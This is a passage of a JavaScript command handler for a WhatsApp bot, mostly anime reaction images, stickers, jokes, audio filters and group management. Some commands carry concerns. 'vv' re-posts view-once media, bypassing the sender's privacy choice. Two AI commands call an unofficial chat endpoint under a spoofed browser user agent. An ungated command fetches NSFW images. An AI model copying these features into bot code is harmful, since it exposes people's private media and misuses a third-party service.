}
break;

case 'animesearch': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"The anime archives are restricted."_`
        );
    }
    
    if (!text) {
        return reply(
            `🔍 *Anime Archive Search*\n\n` +
            `❌ Which anime are you searching for?\n\n` +
            `*Example:* ${prefix}animesearch Naruto\n\n` +
            `_"Specify your target... the archives await."_`
        );
    }
    
    const malScraper = require('mal-scraper');
    const anime = await malScraper.getInfoFromName(text).catch(() => null);
    
    if (!anime) {
        return reply(
            `❌ *Anime Not Found*\n\n` +
            `Could not find "${text}" in the archives.\n\n` +
            `_"This title does not exist in our records..."_`
        );
    }
    
    let animetxt = `
📺 *Anime Archive Entry*

🎀 *Title:* ${anime.title}
🎋 *Type:* ${anime.type}
🎐 *Premiered:* ${anime.premiered}
💠 *Episodes:* ${anime.episodes}
📈 *Status:* ${anime.status}
💮 *Genres:* ${anime.genres}
📍 *Studio:* ${anime.studios}
🌟 *Score:* ${anime.score}
💎 *Rating:* ${anime.rating}
🏅 *Rank:* ${anime.ranked}
💫 *Popularity:* ${anime.popularity}
♦️ *Trailer:* ${anime.trailer}
🌐 *URL:* ${anime.url}

❄️ *Synopsis:*
${anime.synopsis}

_"Knowledge of all anime... archived for eternity."_ - Itachi Uchiha`;

    await rich.sendMessage(
        m.chat,
        { 
            image: { url: anime.picture }, 
            caption: animetxt 
        },
        { quoted: m }
    );
}
break;

case 'animehighfive': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"This gesture is reserved for the worthy."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🙏 *High Five Jutsu*\n\n_"A gesture of camaraderie... bonds forged through respect."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(
                `❌ *Gesture Failed*\n\n` +
                `Error performing high five.\n\n` +
                `_"The connection was lost..."_`
            );
        });
    } catch (e) {
        return reply(
            `❌ *High Five Failed*\n\n` +
            `Could not retrieve image.\n\n` +
            `_"The gesture could not be completed..."_`
        );
    }
}
break;

case 'animecringe': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Not all moments deserve to be witnessed..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😬 *Cringe Moment Archive*\n\n_"Even shinobi have awkward moments... witness with caution."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(
                `❌ *Archive Access Failed*\n\n` +
                `Error retrieving cringe moment.\n\n` +
                `_"Perhaps it's for the best..."_`
            );
        });
    } catch (e) {
        return reply(
            `❌ *Cringe Archive Failed*\n\n` +
            `Could not retrieve image.\n\n` +
            `_"The awkward moment remains hidden..."_`
        );
    }
}
break;
case 'animedance': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Not all movements are meant to be shared..."_`
        );
    }
    
    reply(`💃 *Summoning dance sequence...*\n\n_"Graceful movements in progress..."_`);
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `💃 *Dance of Joy*\n\n_"Even warriors need to express themselves through movement."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Dance Failed*\n\n_"The rhythm was lost..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve dance*\n\n_"The movement could not be captured..."_`);
    }
}
break;

case 'animehappy': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Joy is a privilege of leadership..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😊 *Moment of Happiness*\n\n_"Cherish these rare moments of joy... they are fleeting."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Happiness Failed*\n\n_"Joy could not be found..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve happiness*\n\n_"The smile faded away..."_`);
    }
}
break;

case 'animeglomp': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Such affection is reserved for the worthy..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🤗 *Embrace of Affection*\n\n_"Sometimes a warm embrace says more than a thousand words."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Embrace Failed*\n\n_"The connection was broken..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve glomp*\n\n_"The warmth could not be shared..."_`);
    }
}
break;

case 'animesmug': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Confidence is earned, not given..."_`
        );
    }
    
    reply(`😏 *Summoning smug expression...*\n\n_"Confidence materializing..."_`);
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😏 *Confident Smirk*\n\n_"A knowing smile... when you're three steps ahead."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Smug Failed*\n\n_"The confidence wavered..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve smug*\n\n_"The smirk faded..."_`);
    }
}
break;

case 'animeblush': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Even shinobi feel embarrassment..."_`
        );
    }
    
    reply(`😊 *Summoning blush reaction...*\n\n_"A rare moment of vulnerability..."_`);
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😳 *Moment of Embarrassment*\n\n_"Even the strongest warriors blush... it shows we're human."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Blush Failed*\n\n_"The embarrassment passed..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve blush*\n\n_"The red cheeks faded..."_`);
    }
}
break;

case 'animewave': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Not all greetings are for everyone..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `👋 *Friendly Wave*\n\n_"A simple gesture... yet it carries warmth and recognition."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Wave Failed*\n\n_"The greeting was lost..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve wave*\n\n_"The hand lowered..."_`);
    }
}
break;

case 'animesmile': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"True smiles are precious and rare..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😊 *Genuine Smile*\n\n_"A true smile... the most powerful weapon and the gentlest gift."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Smile Failed*\n\n_"The smile disappeared..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve smile*\n\n_"The joy could not be shown..."_`);
    }
}
break;
case 'animepoke': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Not everyone deserves to poke the bear..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `👉 *Playful Poke*\n\n_"A gentle nudge... to get your attention."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Poke Failed*\n\n_"The touch missed..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve poke*\n\n_"The finger withdrew..."_`);
    }
}
break;

case 'animewink': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"A wink carries hidden meaning..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😉 *Knowing Wink*\n\n_"A silent message... understood by those who matter."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Wink Failed*\n\n_"The eye remained still..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve wink*\n\n_"The signal was lost..."_`);
    }
}
break;

case 'animebonk': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Discipline requires authority..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🔨 *Disciplinary Bonk*\n\n_"A gentle reminder... to stay focused."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Bonk Failed*\n\n_"The correction missed..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve bonk*\n\n_"Justice was delayed..."_`);
    }
}
break;

case 'animebully': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Bullying is beneath a true shinobi..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `😈 *Playful Teasing*\n\n_"Sometimes teasing strengthens bonds... but know the limit."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Bully Failed*\n\n_"The teasing backfired..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve bully*\n\n_"Kindness prevailed instead..."_`);
    }
}
break;

case 'animeyeet': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Not everyone can master the art of yeeting..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🚀 *Supreme Yeet Technique*\n\n_"Sometimes problems require... forceful ejection."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Yeet Failed*\n\n_"Gravity won..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve yeet*\n\n_"The throw was cancelled..."_`);
    }
}
break;

case 'animebite': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Fangs are reserved for worthy opponents..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🦷 *Playful Bite*\n\n_"A small nip... to show affection or warning."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Bite Failed*\n\n_"The teeth missed..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve bite*\n\n_"The fangs retracted..."_`);
    }
}
break;

case 'animelick': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Such gestures require trust..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `👅 *Affectionate Lick*\n\n_"An unusual gesture... but bonds take many forms."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Lick Failed*\n\n_"The gesture was too awkward..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve lick*\n\n_"Perhaps it's better this way..."_`);
    }
}
break;

case 'animekill': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"The power to end life is not given lightly..."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `⚔️ *Assassination Technique*\n\n_"Forgive me... but this had to be done."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(`❌ *Kill Failed*\n\n_"The target survived..."_`);
        });
    } catch (e) {
        return reply(`❌ *Could not retrieve kill*\n\n_"Mercy prevailed..."_`);
    }
}
break;

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"These stickers are reserved for leadership."_`
        );
    }
    
    try {
        axios.get(`https://api.waifu.pics/sfw/${command}`)
        .then(({data}) => {
            rich.sendImageAsSticker(from, data.url, m, { 
                packname: global.packname, 
                author: global.author 
            });
        });
    } catch (e) {
        return reply(
            `❌ *Sticker Creation Failed*\n\n` +
            `Could not create ${command} sticker.\n\n` +
            `_"The technique could not be sealed into a sticker..."_`
        );
    }
}
break;
 case 'ai': {
  if (!text) return reply('Example: .ai what is the capital of France?');

  await rich.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "WhatsApp Bot"
      }
    });

    await rich.sendMessage(m.chat, {
      text: `╭─❍ AI Assistant\n│\n│ Q: ${text}\n│\n│ A:\n│ ${data}\n│\n╰─✅Need anything else?`
    }, { quoted: m });

  } catch (e) {
    await reply(`AI encountered a problem: ${e.message}`);
  }
}
break
case 'idch': {
if (!isCreator) return reply("Sorry, only the owner can use this command");
if (!text) return reply("example : link channel")
if (!text.includes("https://whatsapp.com/channel/")) return reply("not a valid Link ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await rich.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(teks)
}
    break;
 case 'closetime': {
    if (!isCreator) return reply("Sorry, only the owner can use this command");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply("*Usage:* closetime <number> <second/minute/hour/day>\n\n*Example:* 10 minute");

    let timer;
    if (unit === 'second') {
        timer = value * 1000;
    } else if (unit === 'minute') {
        timer = value * 60000;
    } else if (unit === 'hour') {
        timer = value * 3600000;
    } else if (unit === 'day') {
        timer = value * 86400000;
    } else {
        return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example:*\n10 minute');
    }

    reply(`⏳ Close Time ${value} ${unit} starting from now...`);

    setTimeout(async () => {
        try {
            await rich.groupSettingUpdate(m.chat, 'announcement');
            reply(`✅ *On time!* Group has been closed by Admin\nNow only Admins can send messages.`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;
case 'opentime': {
    if (!isCreator) return reply("Sorry, only the owner can use this command");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply('*Usage:* opentime <number> <second/minute/hour/day>\n\n*Example:* 5 second');

    let timer;
    if (unit === 'second') {
        timer = value * 1000;
    } else if (unit === 'minute') {
        timer = value * 60000;
    } else if (unit === 'hour') {
        timer = value * 3600000;
    } else if (unit === 'day') {
        timer = value * 86400000;
    } else {
        return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example:*\n5 second');
    }

    reply(`⏳ Open Time ${value} ${unit} starting from now...`);

    setTimeout(async () => {
        try {
            await rich.groupSettingUpdate(m.chat, 'not_announcement');
            reply(`✅ *On time!* Group has been opened by Admin\nNow members can send messages.`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;
case 'fact':
 if (!isCreator) return reply("Sorry, only the owner can use this command");
    const bby = "https://apis.davidcyriltech.my.id/fact";

    try {
        const nyash = await axios.get(bby);
        const bwess = 'https://files.catbox.moe/ba5km9.jpg';
        const ilovedavid = nyash.data.fact;
        await rich.sendMessage(m.chat, { image: { url: bwess }, caption: ilovedavid });
    } catch (error) {
        reply("An Error Occured.");
    }
    break;
case 'listonline': {
if (!isCreator) return m.reply("Owner only.");
        if (!m.isGroup) return reply(m.grouponly);
        rich.sendMessage(from, { react: { text: "✅", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        rich.sendText(m.chat, ' 「Members Online」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break;
case 'gpt4': case 'openai': case 'xxai': {
if (!isCreator) return reply("Sorry, only the owner can use this command");
  if (!text) return reply(`Ask me anything example ${command} how are you?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break;

case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;

        // Optional: Generate image using API
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;

        rich.sendMessage(m.chat, {
            image: { url: quoteImg },
            caption: `_"${quote}"_\n\n— *${author}*`
        }, { quoted: m });

    } catch (err) {
        m.reply('Failed to fetch quote.');
    }
}
break;

case 'joke': {
  let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/gr1jfa.jpg' },
    caption: `*😂 Here's a joke for you:*\n\n${data.joke}`
  }, { quoted: m });
}
break;
case 'truth': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lhviht.jpg' },
    caption: `*🔥 Truth Time!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
case 'dare': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/t01fmm.jpg' },
    caption: `*🔥 Dare Challenge!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
case 'jid':{
            reply(from)
           }
          break;
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                let media = await rich.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return reply(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    rich.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                reply(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            reply('Invalid command');
        }
    } catch (e) {
        reply(e);
    }
    break;

case 'say':{

if (!qtext) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return rich.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break;

// waifu cases

    case "rwaifu": {
    
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await rich.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "Your rwaifu by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃"
      }, { quoted: m }); // Add quoted  for context
      }
      break;
      case 'waifu' :

waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
rich.sendMessage(from, {image: {url:waifudd.data.url},caption:`Your waifu by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃 ᴠ1`}, { quoted:m }).catch(err => {
 return('Error!')
})
break;      
case 'vv':
case 'vv2': {
if (!isCreator) return reply("Owner only");
    if (!m.quoted) return reply('please reply to a view-once image, video, or voice note!');

    try {
        const mediaBuffer = await rich.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('Pleass try again. image/video or voice Only.');  
        }  

        const mediaType = m.quoted.mtype;  

        if (mediaType === 'imageMessage') {  
            await rich.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "Image by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃" 
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await rich.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "Video by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃"
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await rich.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg',  
                ptt: true,  
                caption: "voice by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃"
            }, { quoted: m });
        } else {  
            return reply('Only images, videos, or voice notes,Can be accepted.');  
        }
    } catch (error) {
        console.error('Error:', error);
        await replyn('Something went wrong! Try again');
    }
}
break;

case 'qc': {
  if (!text) return reply('Use format: *.qc your quote*');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await rich.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await rich.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    reply('Oops! Failed to create your quote sticker.');
  }
}
break;

case 'shorturl':{
if (!text) return reply('[ Wrong! ] link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return reply(`*Error: Could not generate a short URL.*`);
let done = `*[ Done by 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
 reply(done)
}
break;

case 'unblock': case 'unblocked': {

	 if (!isCreator) return reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': case 'blocked': {
	
	 if (!isCreator) return reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;

case 'creategc':
case 'creategroup': {
  if (!isCreator) return reply("Owner only.");

  const groupName = args.join(" ");
  if (!groupName) return reply(`Use *${prefix + command} groupname*`);

  try {
    const cret = await rich.groupCreate(groupName, []);
    const code = await rich.groupInviteCode(cret.id);
    const link = `https://chat.whatsapp.com/${code}`;

    const teks = `「 Group Created 」
▸ *Name:* ${cret.subject}
▸ *Group ID:* ${cret.id}
▸ *Owner:* @${cret.owner.split("@")[0]}
▸ *Created:* ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
▸ *Invite Link:* ${link}`;

    rich.sendMessage(m.chat, {
      text: teks,
      mentions: [cret.owner]
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply("Failed to create group. Please check and try again.");
  }
}
break;
// take 
case 'toimg':
  {
    const quoted = m.quoted ? m.quoted : null
    const mime = (quoted?.msg || quoted)?.mimetype || ''
    if (!quoted) return reply('Reply to a sticker/image.')
    if (!/webp/.test(mime)) return reply(`Reply to a sticker with *${prefix}toimg*`)
    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp')
    const media = await rich.downloadMediaMessage(quoted)
    const filePath = `./tmp/${Date.now()}.jpg`
    fs.writeFileSync(filePath, media)
    await rich.sendMessage(m.chat, { image: fs.readFileSync(filePath) }, { quoted: m })
    fs.unlinkSync(filePath)
  }
  break;
  case "play":
  case "play2": {
if (!text) return reply(example("past lives"))
await rich.sendMessage(m.chat, {react: {text: '🎧', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await rich.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await rich.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return reply("Error! Result Not Found")
}
}
 break
case 'kick': {
  if (!isCreator) return reply("Owner only");
  if (!m.quoted) return reply("Tag or quote the user to kick!");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("Only group admins can kick");
  if (!isBotAdmins) return reply("Bot must be admin");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'remove');
  reply("User has been kicked Out of the group");
